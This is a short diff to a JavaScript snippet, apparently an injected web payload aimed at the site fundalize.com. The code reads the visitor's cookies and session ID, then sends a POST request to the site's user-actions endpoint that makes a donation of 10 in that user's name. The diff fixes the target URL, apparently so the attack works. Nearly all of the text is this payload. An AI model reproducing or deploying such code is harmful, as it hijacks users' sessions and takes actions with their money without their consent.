@@ -1,6 +1,6 @@
 
 var xhttp = new XMLHttpRequest();
-xhttp.open('POST', 'fundalize.com/includes/ajax_useractions.php', true);
+xhttp.open('POST', 'http://fundalize.com/includes/ajax_useractions.php', true);
 var cookies = document.cookie;
 var SID = getCookie('session');
 var params = 'uid=20936&pid='+user_id+'&amount=10&session='+SID+'&message=Met%20liefde%20gegeven%203>&mode=donate';
